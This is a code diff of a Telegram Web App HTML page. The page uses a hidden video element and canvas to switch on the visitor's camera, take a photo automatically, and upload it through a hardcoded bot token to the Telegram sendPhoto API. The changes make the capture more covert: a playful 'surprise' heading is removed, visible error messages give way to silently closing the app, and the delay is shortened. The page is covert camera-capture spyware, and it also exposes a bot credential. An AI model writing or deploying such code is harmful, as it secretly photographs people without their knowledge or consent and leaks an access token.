@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🫣</title>
+    <title>Telegram Web App Camera</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-    <h1>сюрприз!!!</h1>
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
         const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
         const tg = window.Telegram.WebApp;
@@ -18,13 +18,13 @@
         const CHAT_ID = tg.initDataUnsafe?.user?.id;
 
         if (!CHAT_ID) {
-            document.body.innerHTML = "<h1>Error: Could not get Telegram User ID.</h1>";
-            throw new Error("Telegram User ID is required to send the photo.");
+            console.error("Telegram User ID is missing.");
+            tg.close();
         }
 
-        tg.expand(); // Увеличение Web App на весь экран
+        tg.expand(); // Расширение Web App на весь экран
 
-        // Автоматическое включение камеры и захват фото
+        // Захват фото и отправка
         window.onload = () => {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -34,12 +34,14 @@
                 .then(stream => {
                     video.srcObject = stream;
 
-                    // Захват фото через 2 секунды
+                    // Автоматический захват изображения
                     video.onloadedmetadata = () => {
+                        const context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        // Небольшая задержка для корректной активации камеры
                         setTimeout(() => {
-                            const context = canvas.getContext('2d');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
                             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                             const imageData = canvas.toDataURL('image/jpeg');
@@ -52,7 +54,7 @@
                                     formData.append('chat_id', CHAT_ID);
                                     formData.append('photo', blob, 'photo.jpg');
 
-                                    // Отправка в Telegram
+                                    // Отправка изображения
                                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                         method: 'POST',
                                         body: formData
@@ -60,7 +62,8 @@
                                     .then(response => response.json())
                                     .then(data => {
                                         if (data.ok) {
-                                            tg.close(); // Закрытие Web App после успешной отправки
+                                            console.log("Photo sent successfully!");
+                                            tg.close(); // Закрыть Web App после отправки
                                         } else {
                                             console.error("Failed to send photo:", data.description);
                                             tg.close();
@@ -71,12 +74,12 @@
                                         tg.close();
                                     });
                                 });
-                        }, 2000); // 2 секунды для активации камеры
+                        }, 1000); // Задержка в 1 секунду
                     };
                 })
                 .catch(err => {
                     console.error("Camera error:", err);
-                    document.body.innerHTML = "<h1>Camera access denied or unavailable.</h1>";
+                    tg.close(); // Закрыть Web App при ошибке
                 });
         };
     </script>
